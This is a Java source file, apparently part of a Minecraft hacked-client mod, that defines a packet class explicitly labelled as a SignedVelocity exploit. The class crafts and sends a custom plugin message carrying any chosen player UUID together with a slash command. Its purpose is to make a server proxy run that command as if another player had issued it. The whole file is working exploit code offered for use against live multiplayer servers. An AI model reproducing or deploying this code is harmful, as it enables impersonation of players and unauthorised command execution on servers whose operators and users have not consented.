package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record SignedVelocityPayloadPacket(String uuid, String command) implements CustomPayload {

    public static final PacketCodec<PacketByteBuf, SignedVelocityPayloadPacket> CODEC = CustomPayload.codecOf(SignedVelocityPayloadPacket::write, SignedVelocityPayloadPacket::new);
    public static final Id<SignedVelocityPayloadPacket> ID = new Id<>(IdentifierConstants.SIGNEDVELOCITY_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet from a byte buffer.
     *
     * @param buf The buffer containing the serialized packet data.
     */
    private SignedVelocityPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readString());
    }

    /**
     * Sends the signed velocity payload packet to the server.
     *
     * @param uuid The unique identifier for the user.
     * @param command The command to be executed in the user account.
     */
    public static void send(String uuid, String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new SignedVelocityPayloadPacket(uuid, command)));
    }

    /**
     * Serializes the packet data into the provided byte buffer.
     *
     * @param buf The buffer to which the packet data will be written.
     */
    public void write(PacketByteBuf buf) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(stream);
            out.writeUTF(uuid);
            out.writeUTF("COMMAND_RESULT");
            out.writeUTF("MODIFY");
            out.writeUTF("/" + command);
            buf.writeBytes(stream.toByteArray());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Retrieves the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet.
     */
    public Id<SignedVelocityPayloadPacket> getId() {
        return ID;
    }
}
